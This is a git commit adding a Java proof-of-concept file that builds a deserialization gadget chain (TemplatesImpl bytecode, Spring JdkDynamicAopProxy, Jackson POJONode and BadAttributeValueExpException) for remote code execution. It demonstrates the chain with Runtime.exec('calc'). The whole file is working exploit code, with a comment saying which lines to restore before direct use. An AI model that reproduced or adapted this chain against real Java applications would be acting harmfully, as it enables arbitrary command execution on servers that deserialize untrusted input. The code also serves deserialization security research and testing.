a7a336d303b980adf16b57739e35b7e8b198df3a
Zer0peach <113846577+Zer0peach@users.noreply.github.com>
2023-11-18 16:35:10 +0800

    Create 稳定的jackson.java

---
+++ jackson/稳定的jackson.java
@@ -0,0 +1,80 @@
+package jackson;
+
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.*;
+import org.springframework.aop.framework.AdvisedSupport;
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.Base64;
+
+/*
+ * 直接用的话要恢复注释部分，我这里因为在本地有重写BaseJsonNode删除了writeReplace
+ */
+public class avoid_error {
+
+    public static void main(String[] args) throws Exception {
+
+        ClassPool pool = ClassPool.getDefault();
+//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
+//        ctClass0.removeMethod(writeReplace);
+//        ctClass0.toClass();
+
+        CtClass ctClass = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        ctClass.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
+        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        ctClass.addConstructor(constructor);
+        byte[] bytes = ctClass.toBytecode();
+
+        Templates templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
+        setFieldValue(templatesImpl, "_name", "test");
+        setFieldValue(templatesImpl, "_tfactory", null);
+
+      
+        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
+        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templatesImpl);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+        POJONode jsonNodes = new POJONode(proxyObj);
+
+      
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(exp,jsonNodes);
+
+        deserial(serial(exp));
+
+    }
+    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj, arg);
+    }
+    public static void deserial(String data) throws Exception {
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+    public static String serial(Object data) throws Exception {
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
+        objectOutputStream.writeObject(data);
+        objectOutputStream.close();
+        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
+        return res;
+    }
+}
